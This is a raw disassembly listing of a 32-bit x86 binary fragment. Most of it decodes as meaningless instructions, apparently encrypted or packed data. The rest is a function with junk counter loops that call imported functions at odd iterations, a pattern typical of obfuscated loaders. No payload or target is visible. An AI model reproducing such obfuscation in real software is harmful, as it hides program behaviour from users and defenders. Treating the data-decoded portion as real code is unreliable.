  40bb25:	sub    eax,0x9feab666
  40bb2a:	sbb    eax,0x790fdc55
  40bb2f:	cmp    eax,0x743fbcbc
  40bb34:	(bad)  
  40bb36:	loopne 0x40bb21
  40bb38:	loope  0x40bb50
  40bb3a:	test   eax,0xfedab7db
  40bb3f:	mov    esi,0x9247f516
  40bb44:	xchg   ebp,eax
  40bb45:	or     ah,cl
  40bb47:	cmp    al,0xae
  40bb49:	fs cdq 
  40bb4b:	xor    bh,cl
  40bb4d:	mov    ah,0xff
  40bb4f:	pop    esp
  40bb50:	mov    esi,0x830ba9c7
  40bb55:	mov    ebp,0xd468bfc0
  40bb5a:	fs int 0xc6
  40bb5d:	aaa    
  40bb5e:	or     eax,0xd14aec1a
  40bb63:	dec    ebx
  40bb64:	test   eax,0x13b32c48
  40bb69:	lock jnp 0x40bbb2
  40bb6c:	aaa    
  40bb6d:	sub    ebx,ecx
  40bb6f:	or     eax,0xf6770dce
  40bb74:	out    0x16,eax
  40bb76:	ror    dl,cl
  40bb78:	mov    edi,DWORD PTR [edi+0x54]
  40bb7b:	push   0x57
  40bb7d:	jl     0x40bbc7
  40bb7f:	jg     0x40bb41
  40bb81:	dec    esp
  40bb82:	inc    bh
  40bb84:	mov    esi,0x6038717c
  40bb89:	jb     0x40bbb3
  40bb8b:	pop    esp
  40bb8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb8d:	jo     0x40bb8c
  40bb8f:	in     al,0x45
  40bb91:	xor    bh,BYTE PTR [esi]
  40bb93:	adc    eax,0xe911940c
  40bb98:	mov    bl,0xf7
  40bb9a:	mov    cl,0x77
  40bb9c:	mov    WORD PTR [ebp-0x5a],fs
  40bb9f:	inc    ebp
  40bba0:	out    0xe7,eax
  40bba2:	or     ah,BYTE PTR [edi]
  40bba4:	mov    edi,0xe5e8aeda
  40bba9:	mov    dh,0xbd
  40bbab:	jno    0x40bb8b
  40bbad:	popa   
  40bbae:	lods   al,BYTE PTR ds:[esi]
  40bbaf:	shr    DWORD PTR [eax+0x26],cl
  40bbb2:	cmp    eax,0xe4926e00
  40bbb7:	lea    ecx,[ebx]
  40bbb9:	sbb    al,bh
  40bbbb:	push   ecx
  40bbbc:	mov    esi,0x66bb720
  40bbc1:	(bad)  
  40bbc2:	hlt    
  40bbc3:	cmp    al,0xec
  40bbc5:	pop    eax
  40bbc6:	jl     0x40bba3
  40bbc8:	or     dl,BYTE PTR [di]
  40bbcb:	sar    BYTE PTR [eax+0x50],0x84
  40bbcf:	or     ebx,edi
  40bbd1:	leave  
  40bbd2:	mov    cl,0xc5
  40bbd4:	(bad)  
  40bbd5:	call   0xf9a216a0
  40bbda:	push   eax
  40bbdb:	(bad)  
  40bbdc:	js     0x40bba2
  40bbde:	inc    esp
  40bbdf:	mov    ds:0x16ef178d,eax
  40bbe4:	mov    ecx,0x8a3240d4
  40bbe9:	jp     0x40bc61
  40bbeb:	or     DWORD PTR [edi-0x20],ecx
  40bbee:	fs xchg ecx,eax
  40bbf0:	pushf  
  40bbf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf2:	loope  0x40bc33
  40bbf4:	in     eax,0xb9
  40bbf6:	in     eax,dx
  40bbf7:	std    
  40bbf8:	mov    ds:0x814525cb,al
  40bbfd:	sbb    eax,0x9567ac41
  40bc02:	out    0xcb,eax
  40bc04:	dec    ebp
  40bc05:	dec    bp
  40bc07:	xchg   BYTE PTR [esi+0x676ae74a],ch
  40bc0d:	jae    0x40bbc5
  40bc0f:	test   DWORD PTR [bp+si],esi
  40bc12:	adc    DWORD PTR [eax+0x76],esp
  40bc15:	jbe    0x40bbce
  40bc17:	and    ebp,DWORD PTR [eax]
  40bc19:	adc    ecx,ecx
  40bc1b:	bound  esi,QWORD PTR [ecx]
  40bc1d:	cs inc esp
  40bc1f:	jo     0x40bbf6
  40bc21:	shl    DWORD PTR [ecx+0x7],cl
  40bc24:	mov    cl,0x95
  40bc26:	inc    ebp
  40bc27:	test   al,0x4f
  40bc29:	rcr    DWORD PTR [ecx+ecx*8+0x75],cl
  40bc2d:	popf   
  40bc2e:	(bad)  
  40bc2f:	leave  
  40bc30:	xchg   edi,eax
  40bc31:	int3   
  40bc32:	ds loop 0x40bc67
  40bc35:	xor    BYTE PTR [edi+0x2239aca1],dl
  40bc3b:	xchg   ebx,eax
  40bc3c:	jp     0x40bc01
  40bc3e:	cmp    al,0x53
  40bc40:	mov    al,ds:0x4539ff5b
  40bc45:	cmp    DWORD PTR [ecx+0x2e28e3e1],ebx
  40bc4b:	pusha  
  40bc4c:	sub    eax,0x4754eed6
  40bc51:	aam    0x34
  40bc53:	cmp    eax,0x2fed93c4
  40bc58:	jge    0x40bc1f
  40bc5a:	pop    eax
  40bc5b:	cmp    DWORD PTR [ecx+0x50],edi
  40bc5e:	push   eax
  40bc5f:	test   eax,0x73446b47
  40bc64:	test   al,0x31
  40bc66:	jne    0x40bc75
  40bc68:	fs push ss
  40bc6a:	test   BYTE PTR [eax-0x7f],dh
  40bc6d:	mov    al,ds:0x5801bf70
  40bc72:	getsec 
  40bc74:	cmp    al,0x32
  40bc76:	and    DWORD PTR [ecx-0xf],edx
  40bc79:	ret    0x61ae
  40bc7c:	add    DWORD PTR [edi+eax*8-0x4f],ebx
  40bc80:	idiv   BYTE PTR [edi]
  40bc82:	mov    DWORD PTR [eax+0x27],eax
  40bc85:	push   0xfffffffb
  40bc87:	fcmovnbe st,st(6)
  40bc89:	xor    DWORD PTR [edx],ecx
  40bc8b:	xchg   edx,eax
  40bc8c:	das    
  40bc8d:	pushf  
  40bc8e:	inc    ebp
  40bc8f:	lahf   
  40bc90:	jno    0x40bca8
  40bc92:	add    eax,0x94a05acc
  40bc97:	cmp    eax,0xe8f8b38d
  40bc9c:	jne    0x40bc67
  40bc9e:	(bad)  
  40bc9f:	out    dx,al
  40bca0:	jns    0x40bc99
  40bca2:	hlt    
  40bca3:	repnz xchg ebp,eax
  40bca5:	mov    eax,0xb3a3db90
  40bcaa:	jge    0x40bc38
  40bcac:	dec    ebx
  40bcad:	mov    edx,0x14eff34
  40bcb2:	dec    DWORD PTR [edx]
  40bcb4:	inc    ecx
  40bcb5:	push   ds
  40bcb6:	dec    esp
  40bcb8:	popa   
  40bcb9:	iret   
  40bcba:	fmulp  st(6),st
  40bcbc:	mov    edx,0xc32c0ca1
  40bcc1:	dec    esp
  40bcc2:	or     ah,BYTE PTR es:0x142460b1
  40bcc9:	push   edi
  40bcca:	imul   edi,DWORD PTR [ebp-0x3d6acb0d],0x6cdf9401
  40bcd4:	jns    0x40bd3c
  40bcd6:	push   ss
  40bcd7:	mov    ch,0xdf
  40bcd9:	paddusw mm2,mm1
  40bcdc:	ds mov dh,0xd7
  40bcdf:	dec    esi
  40bce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bce1:	ret    
  40bce2:	hlt    
  40bce3:	sub    dh,dh
  40bce5:	dec    esi
  40bce6:	or     al,0x5a
  40bce8:	(bad)  
  40bce9:	fbld   TBYTE PTR [esi+0x1f6f38fd]
  40bcef:	pop    es
  40bcf0:	pop    ss
  40bcf1:	push   esp
  40bcf2:	push   0xffffffaf
  40bcf4:	scas   eax,DWORD PTR es:[edi]
  40bcf5:	mov    edi,0x42dfeffd
  40bcfa:	mov    al,0xc4
  40bcfc:	dec    ebp
  40bcfd:	or     al,0x7b
  40bcff:	lock push es
  40bd01:	pop    DWORD PTR fs:[ecx]
  40bd04:	daa    
  40bd05:	test   al,0x9d
  40bd07:	cmp    al,0xd
  40bd09:	sub    cl,BYTE PTR [edx]
  40bd0b:	adc    al,BYTE PTR [ebp+ebx*1-0x7cc6b174]
  40bd12:	pushf  
  40bd13:	jl     0x40bd11
  40bd15:	pop    ecx
  40bd16:	sub    esp,ecx
  40bd18:	(bad)  
  40bd19:	pop    esi
  40bd1a:	arpl   sp,cx
  40bd1c:	lods   al,BYTE PTR ds:[esi]
  40bd1d:	sbb    ebx,eax
  40bd1f:	xor    BYTE PTR [ecx-0x1d],al
  40bd22:	mov    cl,0x4b
  40bd24:	frstpm(287 only) 
  40bd26:	mov    eax,ds:0x3c2d543e
  40bd2b:	sbb    DWORD PTR [ebp-0x6ea3077b],eax
  40bd31:	(bad)  
  40bd32:	or     edx,DWORD PTR [ecx]
  40bd34:	cs adc eax,0x807d9474
  40bd3a:	sub    dh,BYTE PTR [edx-0x3284dfc6]
  40bd40:	adc    DWORD PTR [ebx-0x4ce6ae5c],ecx
  40bd46:	xchg   BYTE PTR [esi],cl
  40bd48:	jge    0x40bd61
  40bd4a:	push   ds
  40bd4b:	les    eax,FWORD PTR [ecx]
  40bd4d:	adc    BYTE PTR [ebp+0x889098b],al
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	dec    edx
  40bd65:	lds    ebx,FWORD PTR [eiz*1+0x7e7e821c]
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	mov    edx,DWORD PTR [ebp+0x237d891a]
  40bd76:	rcl    DWORD PTR [eax-0x281cdea0],0x2d
  40bd7d:	out    dx,eax
  40bd7e:	int3   
  40bd7f:	push   esi
  40bd80:	or     al,0xa7
  40bd82:	pop    ebp
  40bd83:	add    al,0xa0
  40bd85:	mov    edx,fs
  40bd87:	ins    BYTE PTR es:[edi],dx
  40bd88:	iret   
  40bd89:	push   eax
  40bd8a:	je     0x40be05
  40bd8c:	stos   BYTE PTR es:[edi],al
  40bd8d:	jmp    0xec106755
  40bd92:	daa    
  40bd93:	or     DWORD PTR [ebx],edx
  40bd95:	pop    edx
  40bd96:	add    DWORD PTR [ecx+0x7b106156],0xa8390943
  40bda0:	cmp    BYTE PTR [esi+0x4f],ah
  40bda3:	je     0x40bd64
  40bda5:	mov    al,ds:0xa9bf1236
  40bdab:	xor    al,0xe8
  40bdad:	mov    ds:0x51056055,al
  40bdb2:	jo     0x40bdbd
  40bdb4:	pop    edx
  40bdb5:	mov    esp,0x88aa8056
  40bdba:	cmp    al,BYTE PTR [ebp+0x34a9c564]
  40bdc0:	(bad)  
  40bdc1:	into   
  40bdc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdc3:	cdq    
  40bdc4:	outs   dx,BYTE PTR ds:[esi]
  40bdc5:	mov    eax,DWORD PTR ds:0xe8401ad9
  40bdcb:	rcr    DWORD PTR [esi-0x66],1
  40bdce:	push   0x1c
  40bdd0:	add    eax,0x4732199a
  40bdd5:	pop    ecx
  40bdd6:	mov    DWORD PTR [esi+0x3f3003f4],esp
  40bddc:	cmp    al,dl
  40bdde:	int    0x45
  40bde0:	and    DWORD PTR [edx+0x62e7e639],edx
  40bde6:	das    
  40bde7:	jo     0x40be25
  40bde9:	inc    ecx
  40bdea:	hlt    
  40bdeb:	data16 mov fs,WORD PTR ds:0xd56eba30
  40bdf2:	das    
  40bdf3:	push   0x6d0cf74d
  40bdf8:	out    0x6,eax
  40bdfa:	sub    al,0x3e
  40bdfc:	inc    esp
  40bdfd:	test   al,0xab
  40bdff:	out    dx,eax
  40be00:	repz jbe 0x40be3c
  40be03:	mov    ds:0x1b1ff60f,al
  40be08:	stos   DWORD PTR es:[edi],eax
  40be09:	mov    BYTE PTR [edi+0x78ccf2f5],ah
  40be0f:	cmp    DWORD PTR [edx+0x7b],ecx
  40be12:	xor    al,0x87
  40be14:	xor    eax,ecx
  40be16:	xor    BYTE PTR [edi+0x27],al
  40be19:	loope  0x40be16
  40be1b:	data16 mov ds:0xfd6998ec,al
  40be21:	mov    bl,0x8d
  40be23:	adc    eax,0xb7df42b1
  40be28:	clc    
  40be29:	add    eax,0xb678ff2f
  40be2e:	in     eax,dx
  40be2f:	ins    DWORD PTR es:[edi],dx
  40be30:	mov    dl,0xe
  40be32:	fs cld 
  40be34:	mov    ah,0x65
  40be36:	cmp    al,0x6e
  40be38:	loope  0x40bdd6
  40be3a:	clc    
  40be3b:	mov    dh,0xdc
  40be3d:	aam    0x2b
  40be3f:	hlt    
  40be40:	and    eax,0xd6ddb9d0
  40be45:	ins    DWORD PTR es:[edi],dx
  40be46:	mov    ah,0xa4
  40be48:	hlt    
  40be49:	shl    ecx,cl
  40be4b:	dec    esi
  40be4c:	jbe    0x40bdf2
  40be4e:	or     ch,BYTE PTR [edi]
  40be50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be51:	push   esi
  40be52:	adc    esp,DWORD PTR [eax+eax*1+0x65]
  40be56:	pop    ecx
  40be57:	mov    dh,0x72
  40be59:	xchg   ecx,eax
  40be5a:	das    
  40be5b:	das    
  40be5c:	pop    ecx
  40be5d:	int    0xd9
  40be5f:	std    
  40be60:	rol    DWORD PTR [ebp+0x3a],cl
  40be63:	mov    es:0xc346cd46,eax
  40be69:	shl    DWORD PTR [esp+ebx*4],0x1b
  40be6d:	mov    ebx,gs
  40be6f:	in     eax,dx
  40be70:	jl     0x40be2d
  40be72:	xor    eax,DWORD PTR [esi+0x4a]
  40be75:	jns    0x40bea3
  40be77:	out    0x75,eax
  40be79:	in     eax,0x60
  40be7b:	mov    ah,0x30
  40be7d:	(bad)  
  40be7e:	outs   dx,DWORD PTR ds:[esi]
  40be7f:	mov    bh,0xa4
  40be81:	fldcw  WORD PTR [ebx-0x17ccdbc4]
  40be87:	cmp    ecx,DWORD PTR [edx]
  40be89:	rcl    DWORD PTR [ecx-0x79a9cdf2],1
  40be8f:	or     edi,0xb7a67e83
  40be95:	mov    edx,0xb7e45639
  40be9a:	gs pop es
  40be9c:	push   0x94bbb1d8
  40bea1:	popa   
  40bea2:	sub    dl,cl
  40bea4:	xor    BYTE PTR [eax-0x371a6bd2],ah
  40beaa:	test   al,0x84
  40beac:	mov    cl,0x5
  40beae:	outs   dx,BYTE PTR ds:[esi]
  40beaf:	pop    ds
  40beb0:	loope  0x40be44
  40beb2:	pop    edx
  40beb3:	sub    BYTE PTR [ebx-0x1c],0x87
  40beb7:	xor    DWORD PTR [eax+0x423f4e9c],edx
  40bebd:	lods   eax,DWORD PTR ds:[esi]
  40bebe:	lods   al,BYTE PTR ds:[esi]
  40bebf:	pop    esp
  40bec0:	jecxz  0x40be58
  40bec2:	fiadd  DWORD PTR ds:0xf09d33a3
  40bec8:	jp     0x40bf0f
  40beca:	jo     0x40be6c
  40becc:	pop    esp
  40becd:	mov    esi,0xe1947ea5
  40bed2:	test   DWORD PTR [esi],esp
  40bed4:	in     al,0x5e
  40bed6:	mov    eax,0x8e601c30
  40bedb:	scas   eax,DWORD PTR es:[edi]
  40bedc:	jl     0x40bf27
  40bede:	inc    ebx
  40bedf:	mov    edi,0x6be2a4a2
  40bee4:	mov    eax,ds:0x441b0a11
  40bee9:	and    eax,0x26494b49
  40beee:	cli    
  40beef:	pushf  
  40bef0:	jo     0x40beb3
  40bef2:	rcl    edx,0x95
  40bef5:	push   esi
  40bef6:	sub    dl,BYTE PTR [edi]
  40bef8:	ja     0x40bf36
  40befa:	and    al,0x84
  40befc:	(bad)  
  40befd:	repnz repnz xor al,0x2a
  40bf01:	push   cs
  40bf02:	sub    edx,DWORD PTR [eax+edx*8]
  40bf05:	ret    
  40bf06:	xor    esp,DWORD PTR [edx-0x4c]
  40bf09:	xchg   esp,eax
  40bf0a:	jne    0x40bee1
  40bf0c:	sahf   
  40bf0d:	mov    edx,0xf78329
  40bf12:	fiadd  DWORD PTR [ebp-0x29fda6f3]
  40bf18:	pop    eax
  40bf19:	pop    ebx
  40bf1a:	dec    ebp
  40bf1b:	xor    esp,edi
  40bf1d:	ret    0xacbd
  40bf20:	lods   eax,DWORD PTR ds:[esi]
  40bf21:	mov    BYTE PTR [esi+0x5e],al
  40bf24:	(bad)  
  40bf25:	mov    esp,0xe45eb07d
  40bf2a:	jle    0x40bf3f
  40bf2c:	xlat   BYTE PTR ds:[ebx]
  40bf2d:	cli    
  40bf2e:	cmp    al,ch
  40bf30:	pop    esp
  40bf31:	mov    ebx,0x83f2b55
  40bf36:	and    al,BYTE PTR [ecx+0x60]
  40bf39:	(bad)  
  40bf3a:	in     al,dx
  40bf3b:	xchg   ebp,eax
  40bf3c:	mov    ecx,0x115d53b3
  40bf41:	unpckhps xmm4,XMMWORD PTR [ebp-0x4a111da6]
  40bf48:	xchg   esi,eax
  40bf49:	mov    WORD PTR [eax+eiz*4],ds
  40bf4c:	jns    0x40bfa2
  40bf4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf4f:	ds into 
  40bf51:	(bad)
  40bf55:	test   BYTE PTR [eax-0x37c2ce7c],bh
  40bf5b:	mov    ebx,0xe45d0529
  40bf60:	mov    ds:0xe8c7811b,eax
  40bf65:	fmul   st,st(1)
  40bf67:	not    DWORD PTR [edx-0x7]
  40bf6a:	sbb    ebp,DWORD PTR [ecx]
  40bf6c:	(bad)  
  40bf6d:	pop    edx
  40bf6e:	xchg   BYTE PTR [edx+ebx*4-0x79],al
  40bf72:	and    ebx,DWORD PTR [ecx+0x7c7d8453]
  40bf78:	call   ebx
  40bf7a:	xchg   esi,eax
  40bf7b:	add    DWORD PTR [ebx+ecx*4],edi
  40bf7e:	push   ecx
  40bf7f:	mov    ebp,0xe0f85378
  40bf84:	outs   dx,BYTE PTR ds:[esi]
  40bf85:	jnp    0x40bf4a
  40bf87:	fadd   DWORD PTR [ebx]
  40bf89:	and    al,bl
  40bf8b:	sbb    BYTE PTR [esi+0x3a16cdd5],al
  40bf91:	push   ecx
  40bf92:	cmp    al,0x9d
  40bf94:	jnp    0x40bf4e
  40bf96:	xor    DWORD PTR [edi+ebp*4+0x44],esi
  40bf9a:	mov    al,ds:0x7c357372
  40bf9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfa0:	mov    edx,0x62ead540
  40bfa5:	push   0xffffffbd
  40bfa7:	jmp    0x9eff:0x93fa9ea3
  40bfae:	dec    ebx
  40bfaf:	or     BYTE PTR [ebx],dh
  40bfb1:	and    ah,BYTE PTR [ecx]
  40bfb3:	jecxz  0x40bf87
  40bfb5:	fdivr  st(1),st
  40bfb7:	or     eax,0x6d933b47
  40bfbc:	push   ecx
  40bfbd:	jle    0x40bf7e
  40bfbf:	cmp    ebp,eax
  40bfc1:	repz add al,bl
  40bfc4:	sub    DWORD PTR [edx],ecx
  40bfc6:	in     al,dx
  40bfc7:	in     eax,dx
  40bfc8:	imul   BYTE PTR [esi]
  40bfca:	ret    
  40bfcb:	repnz fcmovne st,st(7)
  40bfce:	and    DWORD PTR [ecx+edx*2],edi
  40bfd1:	fadd   DWORD PTR [eax]
  40bfd3:	add    esp,edi
  40bfd5:	aad    0x47
  40bfd7:	cli    
  40bfd8:	sbb    dh,BYTE PTR [ecx+0x69]
  40bfdb:	add    DWORD PTR [esp+edi*8+0x78],0xb487dd5c
  40bfe3:	add    dl,BYTE PTR [ebp-0x76c55afd]
  40bfe9:	dec    edi
  40bfea:	sub    al,0x87
  40bfec:	sub    BYTE PTR [ecx-0x5],bh
  40bfef:	clc    
  40bff0:	pop    es
  40bff1:	pop    esi
  40bff2:	cmp    al,0x1c
  40bff4:	shl    BYTE PTR [ebx-0x71],0xa8
  40bff8:	mov    cl,0x97
  40bffa:	ja     0x40bfe9
  40bffc:	xor    eax,0xc6fe80ad
  40c001:	ret    0xfcdc
  40c004:	sbb    BYTE PTR [ecx+0x69],bh
  40c007:	xchg   esp,eax
  40c008:	dec    BYTE PTR [eax-0x43]
  40c00b:	mov    edx,0x818622c8
  40c010:	jp     0x40bf97
  40c012:	aas    
  40c013:	mov    bl,0xbb
  40c015:	rol    BYTE PTR [ebp-0x1fa3393b],0x3e
  40c01c:	sahf   
  40c01d:	inc    ecx
  40c01e:	jge    0x40c01b
  40c020:	enter  0x6bd5,0x5a
  40c024:	gs dec edi
  40c026:	push   eax
  40c027:	lds    edx,FWORD PTR [esi]
  40c029:	sub    ebx,DWORD PTR es:[eax]
  40c02c:	retf   
  40c02d:	mov    bh,0x7b
  40c02f:	push   ds
  40c030:	xchg   ebp,eax
  40c031:	or     esi,DWORD PTR [edi]
  40c033:	pop    esp
  40c034:	add    al,0xdd
  40c036:	mov    dl,0x89
  40c038:	mov    al,ds:0xf57c8995
  40c03d:	jmp    0x4526c59a
  40c042:	test   ebp,esi
  40c044:	pop    ds
  40c045:	pop    edx
  40c046:	cli    
  40c047:	std    
  40c048:	push   0x171ffe0b
  40c04d:	js     0x40c0a6
  40c04f:	icebp  
  40c050:	pop    esp
  40c051:	push   edx
  40c052:	in     al,0x2f
  40c054:	mov    eax,ebp
  40c056:	repz mov eax,ds:0xbe350ca8
  40c05c:	or     eax,0x587ad6f0
  40c061:	sbb    DWORD PTR [ebx-0x6c],0x66
  40c065:	and    al,0x8e
  40c067:	jae    0x40c00d
  40c069:	add    al,0x42
  40c06b:	xchg   edi,eax
  40c06c:	cwde   
  40c06d:	inc    edx
  40c06e:	fld    TBYTE PTR [eax]
  40c070:	jg     0x40c09f
  40c072:	dec    ecx
  40c073:	mov    bh,0x8b
  40c075:	inc    ebp
  40c076:	or     al,0x8b
  40c078:	inc    ebp
  40c079:	or     bh,bh
  40c07b:	jne    0x40c075
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433617,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433627
  40c0b4:	and    DWORD PTR ds:0x433683,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4336b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4336b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4336b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4336b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4336b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4336e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4336e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4336e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4336e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4336e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4336e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4336e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4336e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433683,0x1d
  40c169:	cmp    DWORD PTR ds:0x433683,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433683,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433780
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433683,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433683
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433683,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433683
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433683,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4336ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4336b7
  40c1dd:	xor    DWORD PTR ds:0x433613,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43361b,0x43367b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43362b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4336a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4336a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4336a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4336a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4336a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4336eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4336eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4336eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4336eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4336eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4336eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4336eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4336eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433633,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433633
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433633,esi
  40c2c4:	cmp    DWORD PTR ds:0x433633,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433633,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4336f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4336eb
  40c301:	adc    DWORD PTR ds:0x4336fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43364b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433687
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4336e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43362f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4336a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433633,0x433667
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4336ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4336ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4336ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4336ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4336ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4336ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4336ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4336ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43366b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4336ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4336ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43372b,0x43373b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4336af,0x4336bf
  40c3ed:	xor    edi,edi
